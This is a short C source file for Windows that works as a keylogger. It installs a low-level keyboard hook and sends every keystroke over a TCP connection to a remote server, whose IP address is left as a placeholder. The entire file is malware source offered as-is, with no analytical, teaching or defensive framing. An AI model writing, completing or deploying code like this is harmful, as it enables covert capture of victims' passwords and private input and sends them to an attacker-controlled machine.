// client.c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib,"ws2_32.lib") // Link with ws2_32.lib

#define SERVER_IP "ip_add"  // Replace with the remote machine's IP address
#define PORT 8888
#define BUFFER_SIZE 1024

SOCKET client_socket; // Global socket variable

// Hook procedure to log keyboard events
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        
        // Prepare the data to be sent
        char buffer[BUFFER_SIZE];
        sprintf(buffer, "%c", pKey->vkCode);

        // Send the data to the server
        int send_result = send(client_socket, buffer, strlen(buffer), 0);
        if (send_result == SOCKET_ERROR) {
            printf("Send failed: %d\n", WSAGetLastError());
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    WSADATA wsa;
    struct sockaddr_in server;
    int send_result;

    // Initialize Winsock
    printf("Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0) {
        printf("Failed. Error Code: %d\n", WSAGetLastError());
        return 1;
    }
    printf("Initialized.\n");

    // Create a socket
    if ((client_socket = socket(AF_INET , SOCK_STREAM , 0)) == INVALID_SOCKET) {
        printf("Could not create socket: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    printf("Socket created.\n");

    // Setup the server address structure
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    // Set timeout options
    struct timeval timeout;
    timeout.tv_sec = 10;  // 10 seconds timeout
    timeout.tv_usec = 0;
 
    setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    setsockopt(client_socket, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

    // Connect to the remote server
    if (connect(client_socket, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connection failed: %d\n", WSAGetLastError());
        closesocket(client_socket);
        WSACleanup();
        return 1;
    }
    printf("Connected to server.\n");

    // Install the hook
    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, HookProc, NULL, 0);
    if (hhook == NULL) {
        printf("Hook is not installed.\n");
    } else {
        printf("Hook is installed.\n");
    }

    // Message loop to keep the hook running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) { 
        TranslateMessage(&msg); 
        DispatchMessage(&msg); 
    }

    // Uninstall the hook
    UnhookWindowsHookEx(hhook);

    // Cleanup
    closesocket(client_socket);
    WSACleanup();

    return 0;
}